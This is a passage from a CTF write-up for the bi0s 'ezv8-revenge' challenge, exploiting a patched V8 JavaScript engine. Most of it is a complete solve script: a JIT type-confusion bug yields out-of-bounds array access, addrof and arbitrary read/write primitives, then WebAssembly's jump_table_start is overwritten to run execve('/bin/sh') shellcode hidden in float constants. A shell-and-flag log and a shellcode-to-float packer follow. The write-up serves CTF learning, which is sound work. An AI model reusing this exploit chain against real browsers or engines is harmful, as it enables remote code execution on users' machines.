   0x7ffff3a72e33:      int3
   0x7ffff3a72e34:      int3
   0x7ffff3a72e35:      int3
   0x7ffff3a72e36:      int3
   0x7ffff3a72e37:      int3
```

We could see that executing `wmain();` triggers the watchpoint and we end up with
the code that uses this `jump_table_start` field. Further down we could see
`jmp r15` instruction which reveals that if we overwrite the value of
`jump_table_start`, we could hijack the code execution flow. This is looking
good for us. However, if we try to execute `wmain();` again, this part of
code is not executed anymore. To trigger this again, we need to execute another
function.

```wasm
(module
  (func (export "main") (result f64)
    f64.const 13.37
    f64.const 133.37
    f64.const 1333.37
    drop
    drop
  )
  (func (export "pwn"))
)
```

We update our `wasm.js` with the latest bytecode and re-run it again through debugger.
We then setup the read watchpoint and execute these code

```js
var wmain = instance.exports.main;
wmain();
var pwn = instance.exports.pwn;
pwn();
```

Notice that it breaks when calling `wmain()` and `pwn()`.

```console
V8 version 12.2.0 (candidate)
d8> var wmain = instance.exports.main;
undefined
d8> wmain();

Thread 1 "d8" hit Hardware read watchpoint 1: *0x3c49000da114
gef> info reg r15
r15            0x98c16bfb000       0x98c16bfb000
gef> c

d8> var pwn = instance.exports.pwn;
undefined
d8> pwn();

Thread 1 "d8" hit Hardware read watchpoint 1: *0x3c49000da114
gef> info reg r15
r15            0x98c16bfb005       0x98c16bfb005
```

Also notice that now `r15` is `0x5` more than `jump_table_start`.

Now that we have all the pieces we need, we could start creating `execve('/bin/sh')`
shellcode and update our initial solve script. The starting location of the shellcode
is consistent accross multiple run (but differs between debug and release version).
Hence, we could just observe and use it when overwriting `jump_table_start` field.

## Final Solve Script

The solve script and other helper files could be found on this [link](https://github.com/d0UBleW/ctf/tree/main/bi0s/pwn/ezv8-revenge)

```js
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

function itof(i) {
    int_view[0] = i
    return float_view[0]
}

function ftoi(f) {
    float_view[0] = f
    return int_view[0]
}

function lo(x) {
    return x & BigInt(0xffffffff)
}

function hi(x) {
    return (x >> 32n) & BigInt(0xffffffff)
}

function hex(i) {
    return "0x" + i.toString(16)
}

THRESHOLD = 0x2000

function f(p) {
    a.push(Reflect.construct(function(){}, arguments, p)?4.1835592388585281e-216:0); // itof(0x1337133700010000)
}

let a;
let oob_arr;
let obj_leaker;
let c_aar_arr;
let c_aaw_arr;

let jitted = false

let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            a[0] = {};
            oob_arr = Array(1);
            oob_arr[0] = 1.1;
            obj_leaker = [a];
            c_aar_arr = [2.2];
            c_aaw_arr = [3.3];
        }
        return Object.prototype;
    }
})

for (let i = 0; i <= THRESHOLD; i++) {
    a = Array(8)
    a[1] = 0.1
    a.pop()  // make a room such that push() does not reallocate elements
    if (i == THRESHOLD) {
        jitted = true;
    }
    f(p)
}
console.assert(oob_arr.length == 0x8000)
print("[+] Corrupted oob_arr.length with", oob_arr.length)

function oob_read32(offset) {
    // convert from uint32 indexing to uin64 indexing
    let val = ftoi(oob_arr[offset >> 1])
    if (offset % 2 == 0) {
        return lo(val)
    }
    return hi(val)
}

function oob_write32(offset, val) {
    // convert from uint32 indexing to uin64 indexing
    let temp = ftoi(oob_arr[offset >> 1])
    let new_val;
    if (offset % 2 == 0) {
        new_val = itof((hi(temp) << 32n) | val)
    } else {
        new_val = itof(val << 32n | lo(temp))
    }
    oob_arr[offset >> 1] = new_val
}

const OBJ_LEAKER_OFFSET = 0xd
function addrof(o) {
    obj_leaker[0] = o  // assign our target object to `obj_leaker`
    let addr = oob_read32(OBJ_LEAKER_OFFSET)  // read it using `oob_arr`
    return addr
}

const c_aar_arr_elements_offset = 0x14
const c_aaw_arr_elements_offset = 0x22

function caged_arb_read32(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = lo(ftoi(c_aar_arr[0]))
    return leak
}

function caged_arb_read64(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = ftoi(c_aar_arr[0])
    return leak
}

function caged_arb_write32(addr, val) {
    let elements = addr - 8n | 1n;
    let temp = caged_arb_read32(addr+4n)
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof((temp << 32n) | val)
}

function caged_arb_write64(addr, val) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof(val)
}

/*
(module
  (func (export "main") (result f64)
    f64.const 1.617548436999262e-270
    f64.const 1.6181477269733566e-270
    f64.const 1.6305238557700824e-270
    f64.const 1.6477681441619941e-270
    f64.const 1.6456891197542608e-270
    f64.const 1.6304734321072042e-270
    f64.const 1.6305242777505848e-270
    drop
    drop
    drop
    drop
    drop
    drop
  )
  (func (export "pwn"))
)
*/

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
for (let j = 0x0; j < 10000; j++) {
    wmain()
}

instance_addr = addrof(instance)
jump_table_start = instance_addr + 0x48n
rwx_addr = caged_arb_read64(jump_table_start)
sc_addr = rwx_addr + 0x81an - 0x5n
print("[+] Shellcode @", hex(sc_addr+0x5n))

print("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode")
caged_arb_write32(jump_table_start, sc_addr & BigInt(2**32-1))

 // to trigger jmp to address pointed by jump_table_start, we need another new function
var pwn = instance.exports.pwn;
print("[+] Executing shellcode")
pwn();
```

```console
$ ./solve.py
[+] Opening connection to localhost on port 5555: Done
[*] Switching to interactive mode
[+] Corrupted oob_arr.length with 32768
[+] Shellcode @ 0x334262b8781a
[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode
[+] Executing shellcode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ /catflag
bi0sctf{w3ll_d3f1n1t3ly_4_sk1ll_i55u3_1f3738f8}
```

## References

- <https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-6418.html>
- <https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418>
- <https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157>
- <https://github.com/WebAssembly/wabt>

## Interesting Read

- <https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html>
- <https://docs.google.com/document/d/1HSap8-J3HcrZvT7-5NsbYWcjfc0BVoops5TDHZNsnko/edit#heading=h.suker1x4zgzz>
- <https://jhalon.github.io/chrome-browser-exploitation-1/>
- <https://blog.theori.io/a-deep-dive-into-v8-sandbox-escape-technique-used-in-in-the-wild-exploit-d5dcf30681d4>
- <https://anvbis.au/posts/exploring-historical-v8-heap-sandbox-escapes-i/>
- <https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/>
- <https://mgp25.com/blog/2021/browser-exploitation/>
- <https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/>
- <https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/>
- <https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/>
- <https://v8.github.io/api/head/>

## Appendix

### Building d8 for Debugging

```sh
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH="$(pwd)/depot_tools:$PATH"
fetch v8
cd v8
./build/install-build-deps.sh
git checkout 970c2bf28dd
git apply v8.patch
gclient sync
./tools/dev/v8gen.py x64.debug
ninja -C ./out.gn/x64.debug
cd ./out.gn/x64.debug
./d8
```

### Python3 Script for Shellcode to Floating Numbers

The script to convert shellcode to floating numbers:

```py
#!/usr/bin/env python3

import struct

from pwn import *

context.arch = "amd64"

# based off shellcraft.amd64.linux.execve(path='/bin/sh')
sc = '''
    push 0x68732f6e
    pop rax
    push 0x69622f
    pop rbx
    shl rax, 24
    add rax, rbx
    xor rbx, rbx
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''


def packshellcode(sc, n):  # packs shellcode into n-byte blocks
    ret = []
    cur = b""
    for line in sc.splitlines():
        print(line)
        k = asm(line)
        print(k)
        assert (len(k) <= n)
        if (len(cur) + len(k) <= n):
            cur += k
        else:
            ret += [cur.ljust(6, b"\x90")]  # pad with NOPs
            cur = k

    ret += [cur.ljust(6, b"\x90")]
    return ret


SC = packshellcode(sc, 6)

# Ensure no repeat of 6 byte blocks
D = dict(zip(SC, [SC.count(x) for x in SC]))
assert (max(D.values()) == 1)

# short jmp rel8: https://www.felixcloutier.com/x86/jmp
jmp = b'\xeb'

# add jumps after each 6 byte block
SC = [(x + jmp + b"\x07") for x in SC]

SC = [struct.unpack('<d', x)[0] for x in SC]  # represent as doubles

for i in SC:
    print(f"f64.const {i}")

for i in range(len(SC) - 1):
    print("drop")
```


